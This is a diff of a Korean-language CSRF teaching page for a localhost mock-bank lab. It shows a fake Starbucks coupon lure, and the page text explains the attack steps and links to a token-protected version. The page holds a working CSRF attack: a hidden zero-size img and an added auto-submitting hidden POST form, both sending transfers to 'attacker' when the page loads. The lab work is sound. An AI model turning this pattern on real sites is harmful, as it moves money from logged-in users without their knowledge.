@@ -1,36 +1,116 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ko">
-<head>
-  <meta charset="UTF-8">
-  <title>🎁 무료 쿠폰 증정 이벤트!</title>
-  <style>
-    * { box-sizing: border-box; }
-    body { font-family: 'Segoe UI', sans-serif; background: #fff7ed; margin: 0; padding: 40px 20px; text-align: center; }
-    .banner { background: linear-gradient(135deg, #f97316, #ef4444); color: white; padding: 40px; border-radius: 16px; max-width: 600px; margin: 0 auto 30px; }
-    h1 { font-size: 2rem; margin: 0 0 10px; }
-    .btn { background: white; color: #ef4444; padding: 14px 40px; border-radius: 8px; font-weight: 700; font-size: 1.1rem; border: none; cursor: pointer; margin-top: 20px; }
-    .card { background: white; border-radius: 12px; padding: 24px; max-width: 600px; margin: 0 auto 20px; box-shadow: 0 2px 12px rgba(0,0,0,.1); text-align: left; }
-    h2 { color: #1f2937; }
-    .code-box { background: #1e1e1e; color: #d4d4d4; padding: 14px 18px; border-radius: 6px; font-family: monospace; font-size: 13px; line-height: 1.6; margin: 10px 0; }
-    .hl-tag  { color: #569cd6; }
-    .hl-attr { color: #9cdcfe; }
-    .hl-val  { color: #ce9178; }
-    .hl-cmt  { color: #6a9955; }
-    .step { display: flex; gap: 12px; margin: 10px 0; }
-    .num  { background: #ef4444; color: white; width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 13px; flex-shrink: 0; margin-top:2px; }
-    .warn { background: #fef3c7; border-left: 4px solid #f59e0b; padding: 10px 14px; border-radius: 0 6px 6px 0; margin: 10px 0; font-size: 13px; }
-  </style>
-</head>
-<body>
+  <head>
+    <meta charset="UTF-8" />
+    <title>🎁 무료 쿠폰 증정 이벤트!</title>
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+      body {
+        font-family: "Segoe UI", sans-serif;
+        background: #fff7ed;
+        margin: 0;
+        padding: 40px 20px;
+        text-align: center;
+      }
+      .banner {
+        background: linear-gradient(135deg, #f97316, #ef4444);
+        color: white;
+        padding: 40px;
+        border-radius: 16px;
+        max-width: 600px;
+        margin: 0 auto 30px;
+      }
+      h1 {
+        font-size: 2rem;
+        margin: 0 0 10px;
+      }
+      .btn {
+        background: white;
+        color: #ef4444;
+        padding: 14px 40px;
+        border-radius: 8px;
+        font-weight: 700;
+        font-size: 1.1rem;
+        border: none;
+        cursor: pointer;
+        margin-top: 20px;
+      }
+      .card {
+        background: white;
+        border-radius: 12px;
+        padding: 24px;
+        max-width: 600px;
+        margin: 0 auto 20px;
+        box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
+        text-align: left;
+      }
+      h2 {
+        color: #1f2937;
+      }
+      .code-box {
+        background: #1e1e1e;
+        color: #d4d4d4;
+        padding: 14px 18px;
+        border-radius: 6px;
+        font-family: monospace;
+        font-size: 13px;
+        line-height: 1.6;
+        margin: 10px 0;
+      }
+      .hl-tag {
+        color: #569cd6;
+      }
+      .hl-attr {
+        color: #9cdcfe;
+      }
+      .hl-val {
+        color: #ce9178;
+      }
+      .hl-cmt {
+        color: #6a9955;
+      }
+      .step {
+        display: flex;
+        gap: 12px;
+        margin: 10px 0;
+      }
+      .num {
+        background: #ef4444;
+        color: white;
+        width: 26px;
+        height: 26px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 700;
+        font-size: 13px;
+        flex-shrink: 0;
+        margin-top: 2px;
+      }
+      .warn {
+        background: #fef3c7;
+        border-left: 4px solid #f59e0b;
+        padding: 10px 14px;
+        border-radius: 0 6px 6px 0;
+        margin: 10px 0;
+        font-size: 13px;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- 피해자 눈에 보이는 화면 -->
+    <div class="banner">
+      <h1>🎁 특별 이벤트!</h1>
+      <p style="font-size: 1.1rem; margin: 0">
+        지금 참여하면 스타벅스 기프티콘을 드려요!
+      </p>
+      <button class="btn">지금 바로 받기 →</button>
+    </div>
 
-  <!-- 피해자 눈에 보이는 화면 -->
-  <div class="banner">
-    <h1>🎁 특별 이벤트!</h1>
-    <p style="font-size:1.1rem; margin:0">지금 참여하면 스타벅스 기프티콘을 드려요!</p>
-    <button class="btn">지금 바로 받기 →</button>
-  </div>
-
-  <!--
+    <!--
     ══════════════════════════════════════════════════════════════
     ❌ CSRF 공격 코드 (피해자에게는 보이지 않음)
 
@@ -39,56 +119,101 @@
     이 요청에 자동으로 첨부됨 → 서버는 정상 요청으로 인식.
     ══════════════════════════════════════════════════════════════
   -->
-  <img src="http://localhost:8081/bank.php?action=transfer&to=attacker&amount=500000"
-       width="0" height="0" style="display:none"
-       alt="">
+    <img
+      src="http://localhost:8091/bank-secure.php?action=transfer&to=attacker&amount=500000"
+      width="0"
+      height="0"
+      style="display: none"
+      alt=""
+    />
 
-  <!-- ── 공격 원리 설명 패널 (학습용) ── -->
-  <div class="card">
-    <h2>🔍 공격 원리 분석</h2>
+    <!-- ── 공격 원리 설명 패널 (학습용) ── -->
+    <div class="card">
+      <h2>🔍 공격 원리 분석</h2>
 
-    <div class="step">
-      <div class="num">1</div>
-      <div>피해자(victim)는 <strong>해킹은행(localhost:8081)</strong>에 로그인된 상태입니다.</div>
-    </div>
-    <div class="step">
-      <div class="num">2</div>
-      <div>피해자가 이 페이지(localhost:8082)에 접속합니다. — 낚시 메일, SNS 링크 등으로 유인</div>
-    </div>
-    <div class="step">
-      <div class="num">3</div>
-      <div>브라우저가 페이지를 렌더링하면서 아래 <code>&lt;img&gt;</code> 태그를 자동 로딩합니다:</div>
+      <div class="step">
+        <div class="num">1</div>
+        <div>
+          피해자(victim)는 <strong>해킹은행(localhost:8081)</strong>에 로그인된
+          상태입니다.
+        </div>
+      </div>
+      <div class="step">
+        <div class="num">2</div>
+        <div>
+          피해자가 이 페이지(localhost:8082)에 접속합니다. — 낚시 메일, SNS 링크
+          등으로 유인
+        </div>
+      </div>
+      <div class="step">
+        <div class="num">3</div>
+        <div>
+          브라우저가 페이지를 렌더링하면서 아래 <code>&lt;img&gt;</code> 태그를
+          자동 로딩합니다:
+        </div>
+      </div>
+
+      <div class="code-box">
+        <span class="hl-cmt"
+          >&lt;!-- 피해자 눈에는 보이지 않는 0px 이미지 --&gt;</span
+        ><br />
+        <span class="hl-tag">&lt;img</span>
+        <span class="hl-attr"> src</span>=<span class="hl-val"
+          >"http://localhost:8081/bank.php</span
+        ><br />
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl-val"
+          >?action=transfer&amp;to=attacker&amp;amount=500000"</span
+        ><br />
+        <span class="hl-attr"> width</span>=<span class="hl-val">"0"</span>
+        <span class="hl-attr"> height</span>=<span class="hl-val">"0"</span
+        ><span class="hl-tag">&gt;</span>
+      </div>
+
+      <div class="step">
+        <div class="num">4</div>
+        <div>
+          브라우저는 <strong>해킹은행 세션 쿠키를 자동으로 첨부</strong>하여 GET
+          요청을 전송합니다.
+        </div>
+      </div>
+      <div class="step">
+        <div class="num">5</div>
+        <div>
+          취약한 서버는 출처를 검증하지 않으므로
+          <strong>이체가 즉시 실행</strong>됩니다. 50만원 증발!
+        </div>
+      </div>
+
+      <div class="warn">
+        ⚡ <strong>핵심</strong>: 피해자는 아무것도 클릭하지 않았습니다.
+        페이지를 열기만 했을 뿐인데 이체가 완료됩니다.
+      </div>
     </div>
 
-    <div class="code-box">
-      <span class="hl-cmt">&lt;!-- 피해자 눈에는 보이지 않는 0px 이미지 --&gt;</span><br>
-      <span class="hl-tag">&lt;img</span>
-      <span class="hl-attr"> src</span>=<span class="hl-val">"http://localhost:8081/bank.php</span><br>
-      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl-val">?action=transfer&amp;to=attacker&amp;amount=500000"</span><br>
-      <span class="hl-attr"> width</span>=<span class="hl-val">"0"</span>
-      <span class="hl-attr"> height</span>=<span class="hl-val">"0"</span><span class="hl-tag">&gt;</span>
+    <div class="card">
+      <h2>🛡️ 방어 버전 확인</h2>
+      <p>CSRF 토큰이 적용된 안전한 버전을 확인하세요:</p>
+      <p>
+        👉
+        <a href="http://localhost:8091/bank-secure.php"
+          >http://localhost:8091/bank-secure.php</a
+        >
+      </p>
+      <p>같은 공격을 시도해보면 토큰 불일치로 이체가 차단됩니다.</p>
     </div>
+  </body>
+  <form
+    id="attackForm"
+    action="http://localhost:8091/bank-secure.php"
+    method="POST"
+  >
+    <input type="hidden" name="action" value="transfer" />
+    <input type="hidden" name="to" value="attacker_account" />
+    <input type="hidden" name="amount" value="100000" />
+  </form>
 
-    <div class="step">
-      <div class="num">4</div>
-      <div>브라우저는 <strong>해킹은행 세션 쿠키를 자동으로 첨부</strong>하여 GET 요청을 전송합니다.</div>
-    </div>
-    <div class="step">
-      <div class="num">5</div>
-      <div>취약한 서버는 출처를 검증하지 않으므로 <strong>이체가 즉시 실행</strong>됩니다. 50만원 증발!</div>
-    </div>
-
-    <div class="warn">
-      ⚡ <strong>핵심</strong>: 피해자는 아무것도 클릭하지 않았습니다.
-      페이지를 열기만 했을 뿐인데 이체가 완료됩니다.
-    </div>
-  </div>
-
-  <div class="card">
-    <h2>🛡️ 방어 버전 확인</h2>
-    <p>CSRF 토큰이 적용된 안전한 버전을 확인하세요:</p>
-    <p>👉 <a href="http://localhost:8091/bank-secure.php">http://localhost:8091/bank-secure.php</a></p>
-    <p>같은 공격을 시도해보면 토큰 불일치로 이체가 차단됩니다.</p>
-  </div>
-</body>
+  <script>
+    // 페이지가 열리자마자 위 폼을 자동으로 제출(submit)함
+    document.getElementById("attackForm").submit();
+  </script>
 </html>
